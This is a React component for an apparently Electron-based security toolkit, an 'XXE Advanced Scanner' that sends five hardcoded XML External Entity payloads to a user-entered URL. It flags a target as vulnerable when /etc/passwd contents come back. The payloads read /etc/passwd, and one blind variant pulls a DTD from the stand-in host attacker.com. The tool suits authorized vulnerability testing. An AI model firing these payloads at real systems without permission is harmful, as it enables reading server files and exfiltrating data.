import React, { useState } from 'react';
import { useStore } from '../../store/store';
import ToolWrapper from './ToolWrapper';
import styles from './SharedTool.module.css';
import { ShieldIcon, LoadingIcon } from '../common/Icons';

const XXEAdvanced: React.FC = () => {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [results, setResults] = useState<Array<{ type: string; result: string }>>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const xxePayloads = [
    {
      type: 'Basic XXE',
      payload:
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    },
    {
      type: 'Parameter Entity',
      payload:
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root></root>',
    },
    {
      type: 'Blind XXE',
      payload:
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root></root>',
    },
    {
      type: 'XXE via SOAP',
      payload:
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>',
    },
    {
      type: 'XXE via SVG',
      payload:
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
    },
  ];

  const testXXE = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const found: Array<{ type: string; result: string }> = [];

      for (const { type, payload } of xxePayloads) {
        try {
          const result = await window.electronAPI.net.httpFetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/xml' },
            body: payload,
            timeout: 5000,
          });

          const status = result.status === 200 ? 'Processed' : `Status: ${result.status}`;
          const hasVulnIndicator =
            result.data && (result.data.includes('root:') || result.data.includes('bin/'));
          found.push({ type, result: hasVulnIndicator ? 'VULNERABLE!' : status });
        } catch (err) {
          found.push({ type, result: 'Error/Blocked' });
        }

        await new Promise((resolve) => setTimeout(resolve, 300));
      }

      setResults(found);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'XXE Advanced',
        timestamp: Date.now(),
        input: { targetUrl },
        output: found,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'XXE test failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="XXE Advanced Scanner"
      icon={<ShieldIcon />}
      description="Test for XML External Entity injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com/api/xml"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={testXXE} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test XXE'
            )}
          </button>
        </div>
      </div>

      {error && (
        <div className={styles.errorBox}>
          <strong>Error:</strong> {error}
        </div>
      )}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Testing XXE payloads...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <h3 className={styles.resultTitle}>XXE Test Results</h3>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <span className={styles.code}>{result.type}</span>
              <span
                className={
                  result.result.includes('VULNERABLE') ? styles.textError : styles.resultContent
                }
                style={{ marginLeft: '10px' }}
              >
                {result.result}
              </span>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
};

export default XXEAdvanced;
